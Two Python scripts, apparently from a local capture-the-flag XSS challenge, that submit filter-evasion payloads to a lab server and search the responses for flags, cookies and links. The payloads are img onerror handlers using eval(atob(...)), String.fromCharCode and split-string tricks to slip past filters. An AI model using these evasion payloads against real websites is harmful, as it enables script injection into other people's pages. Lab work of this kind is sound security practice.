import requests
import re

url = "http://127.0.0.1:33031/page"

print("=" * 70)
print("ANALYZING SUCCESSFUL PAYLOADS")
print("=" * 70)

# The key finding: some payloads return "Let the game begin. Good Luck"
# instead of error messages. Let's compare responses.

payloads_to_analyze = [
    ('baseline (empty)', ''),
    ('atob base64', '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'),
    ('fromCharCode', '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'),
    ('window concatenation', '<img src=x onerror=window["ale"+"rt"](1)>'),
    ('document.write', '<img src=x onerror=document.write("XSS")>'),
    ('hostile encoding', '<img/src=x onerror=alert(1)>'),  # using / instead of space
]

for name, payload in payloads_to_analyze:
    resp = requests.post(url, data={"solution": payload})
    
    print(f"\n{'='*60}")
    print(f"PAYLOAD: {name}")
    print(f"Content: {payload}")
    print(f"Status: {resp.status_code}")
    print(f"Length: {len(resp.text)}")
    
    # Extract the solution-text div completely
    match = re.search(r'<div class="solution-text"[^>]*>(.*?)</div>', resp.text, re.DOTALL)
    if match:
        content = match.group(1).strip()
        print(f"\nSolution-text div content:")
        print("-" * 40)
        print(content)
        print("-" * 40)
        
        # Check for different indicators
        if 'error_star.png' in content:
            print("Indicator: ERROR image found")
        if 'Good Luck' in content:
            print("Indicator: 'Good Luck' message found")
        if 'Fail' in content:
            print("Indicator: 'Fail' text found")
            
        # Look for CSS class that indicates success/failure
        if 'success' in content.lower():
            print("Indicator: 'success' class/mention found")
    
    # Look for any flag-like patterns or success indicators
    flag_match = re.search(r'(FLAG|flag|HTB|\{)[A-Za-z0-9_\-]+', resp.text)
    if flag_match:
        print(f"\n!!! Potential flag found: {flag_match.group()}")
    
    # Check for script content in response (XSS would insert JS)
    script_match = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL)
    if script_match:
        print(f"Script content found: {script_match}")

print("\n" + "=" * 70)
print("EXTRACTING FULL RESPONSE FOR 'GOOD LUCK' PAYLOADS")
print("=" * 70)

# Get full response for atob payload
print("\n--- FULL RESPONSE for atob payload ---")
resp = requests.post(url, data={"solution": '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'})
print(resp.text)

import requests
import re

url = "http://127.0.0.1:33031/page"

print("=" * 70)
print("CHECKING FOR FLAGS AND OTHER ENDPOINTS")
print("=" * 70)

# The payload that returns "Good Luck" without error
bypass_payload = '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'

# First, submit the payload and follow redirects if any
resp = requests.post(url, data={"solution": bypass_payload}, allow_redirects=True)
print(f"Final URL after submission: {resp.url}")
print(f"Response length: {len(resp.text)}")

# Check for any hidden or stored data
# Maybe the flag appears in cookies or headers
print("\n--- COOKIES ---")
print(f"Cookies: {resp.cookies}")

print("\n--- HEADERS ---")
for header, value in resp.headers.items():
    print(f"{header}: {value}")

# Search for flag patterns in response
print("\n--- FLAG PATTERN SEARCH ---")
flag_patterns = [
    r'FLAG\{[^}]+\}',
    r'flag\{[^}]+\}',
    r'HTB\{[^}]+\}',
    r'[A-Za-z0-9]{20,}',  # long random strings
]

for pattern in flag_patterns:
    matches = re.findall(pattern, resp.text)
    if matches:
        print(f"Pattern {pattern}: {matches[:3]}")

# Check for any input fields or values in the form that might contain flags
print("\n--- FORM ANALYSIS ---")
form_inputs = re.findall(r'<input[^>]*>', resp.text, re.I)
for inp in form_inputs:
    print(f"Input: {inp}")

# Check for any script tags or JS variables
print("\n--- SCRIPT CONTENT ---")
scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL | re.I)
for script in scripts:
    if script.strip():
        print(f"Script: {script[:200]}")

# Maybe there's a GET parameter or other way to access results
print("\n" + "=" * 70)
print("TESTING OTHER REQUEST METHODS AND PARAMETERS")
print("=" * 70)

# Try GET request to same endpoint
get_resp = requests.get(url)
print(f"\nGET {url}: {get_resp.status_code}")
if get_resp.status_code == 200:
    print(f"Response length: {len(get_resp.text)}")

# Check if there are other endpoints mentioned in the HTML
print("\n--- LINKS AND REFERENCES ---")
links = re.findall(r'href=["\']([^"\']+)["\']', resp.text)
unique_links = list(set(links))
for link in unique_links:
    if not link.startswith('http') and not link.startswith('//'):
        print(f"Local link: {link}")

